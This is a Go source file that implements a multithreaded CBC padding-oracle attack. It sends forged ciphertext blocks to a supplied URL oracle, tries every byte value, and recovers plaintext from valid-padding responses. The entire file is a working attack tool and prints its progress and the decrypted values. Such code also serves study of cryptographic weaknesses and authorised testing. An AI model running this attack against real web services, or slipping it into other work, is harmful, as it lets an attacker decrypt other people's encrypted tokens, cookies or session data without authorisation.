package utils

import (
	"fmt"
	"sync"
)

const (
	concurrency = 10
)

type callOracle func(u, token string) bool
type encodeToken func(buffer []byte) string

type token struct {
	data     string
	chr, pad byte
}

type result struct {
	chr, pad byte
}

// create string C'||Cn to send to oracle with every possible value of C'[k] until find value that has valid padding
func PaddingOracle(chunks [][]byte, urlBase string, callOracle callOracle, encode encodeToken) []byte {
	// spin up workers to call Oracle

	plaintext := make([]byte, 0)
	// Loop through every chunk beginning with the last
	for i := 1; i < len(chunks); i++ {
		fmt.Printf("\n\n** Starting Chunk %d of %d **\n\n", i, len(chunks)-1)
		plainBlock := make([]byte, 0)
		curr, prev := setAttackBlock(chunks, i)
		interm := make([]byte, len(curr))
		// begin with padding byte 01
		padByte := byte(1)
		// loop through every position of chunk, beginning with last
		for chunkPos := len(curr) - 1; chunkPos >= 0; chunkPos-- {
			// fmt.Printf("[*] Padding byte %d for chunk[%d]\n", padByte, chunkPos)
			// try every possible byte value to check valid padding

			// Scope concurrency to character attack on the chunk position
			tokens := make(chan token)
			results := make(chan result)

			// Send tokens to check on tokens channel
			var wg sync.WaitGroup
			for i := 0; i < concurrency; i++ {
				wg.Add(1)

				go func() {
					for token := range tokens {
						isValid := callOracle(urlBase, token.data)
						// only send valid results
						if isValid {
							results <- result{token.chr, token.pad}
						}
						// if isValid {
						// 	done <- true
						// }
					}

					wg.Done()
				}()
			}

			var rwg sync.WaitGroup
			rwg.Add(1)
			go func() {
				for result := range results {
					fmt.Printf("[+] Success: (%v/256) [Byte %d]\n", result.chr, chunkPos)
					// fmt.Println(token)
					// Solve I2 = C1' ^ P2' and P2 = C1 ^ I2
					var plainByte byte
					interm[chunkPos], plainByte = solveByte(prev[chunkPos], result.chr, padByte)
					// unshift / prepend to plainBlock bytes slice
					plainBlock = append([]byte{plainByte}, plainBlock...)
					// break
					// if token.chr == 255 {
					// 	log.Fatalln("Exhausted attack chars without finding valid padding")
					// 	os.Exit(1)
					// }
				}
				rwg.Done()
			}()

			// TODO Concurrently create token work requests and send into tokens channel
			// Note: Closure over these variables would be tricky in a goroutine
			for chr := 0; chr < 256; chr++ {
				tokens <- makeToken(curr, interm, chunkPos, byte(chr), padByte, encode)
			}

			// Close tokens channels once all the requests are sent through
			close(tokens)
			// wait for all the workers to finish before closing results channel
			wg.Wait()
			fmt.Println("Finished waiting for worker group to finish")
			close(results)
			fmt.Println("Closed results channel")

			// wait for all the results to finish
			rwg.Wait()
			fmt.Println("Finished waiting for results go routine")
			// Move on to next padding byte 02, 03, 04... until end of blocksize
			padByte++
		}
		fmt.Printf("\n\nChunk %d Results:\n", i)
		fmt.Printf("[+] Ciphertext [HEX]: %x\n", prev)
		fmt.Printf("[+] Intermediate Bytes [HEX]: %x\n", interm)
		fmt.Printf("[+] Plaintext: %s\n", plainBlock)
		plaintext = append(plaintext, plainBlock...)
	}
	fmt.Println("\n** Finished **\n\n")
	fmt.Printf("[+] Decrypted value (ASCII): %s", string(plaintext))
	return plaintext
}

func solveByte(ciphertext, chr, padByte byte) (byte, byte) {
	interm := chr ^ padByte
	plaintext := interm ^ ciphertext
	return interm, plaintext
}

func setAttackBlock(chunks [][]byte, i int) ([]byte, []byte) {
	curr := chunks[i]
	prev := chunks[i-1]
	// fmt.Println("[*] Current Attack Block:")
	// fmt.Printf("C: %v\n", curr)
	return curr, prev
}

func subAttackBytes(interm, chr, padByte byte) byte {
	// if intermediate value exists, fill that in
	var tmp byte
	if interm != 0 {
		// force intermediate value to desired current padByte
		tmp = interm ^ padByte
		// fmt.Printf("Sub attack byte %v (%v XOR %v)\n", tmp, interm, padByte)
	} else {
		tmp = chr
	}
	return tmp
}

func makeToken(curr, interm []byte, chunkPos int, chr, padByte byte, encode encodeToken) token {
	// create C1' block of random characters
	// tmp := []byte(strings.Repeat("a", len(curr)))
	tmp := make([]byte, len(curr))
	for attackPos := len(curr) - 1; attackPos >= chunkPos; attackPos-- {
		tmp[attackPos] = subAttackBytes(interm[attackPos], chr, padByte)
	}
	fmt.Printf("[-] Test Bytes: %v\n", tmp)
	test := append(tmp, curr...)
	// fmt.Printf("Test: %v\n", test)
	data := encode(test)
	// fmt.Println(token)
	return token{data, chr, padByte}
}
